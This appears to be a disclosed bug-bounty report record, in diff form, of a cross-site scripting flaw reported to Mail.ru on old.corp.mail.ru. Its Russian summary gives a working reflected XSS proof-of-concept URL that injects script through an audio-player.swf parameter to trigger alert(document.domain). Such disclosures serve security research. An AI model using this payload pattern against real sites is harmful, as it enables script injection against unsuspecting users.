@@ -1,0 +1,15 @@
+ReportLink:https://hackerone.com/reports/34130
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/c37hun
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:11.12.2015 11:00:59
+
+Summary:
+
+Уязвимость существует на old.corp.mail.ru
+
+Заходим по нижеуказанной ссылке:
+>http://old.corp.mail.ru/scripts/audio-player.swf?playerID=c37hun\%22%29%29}catch%28e%29{alert%28document.domain%29}//
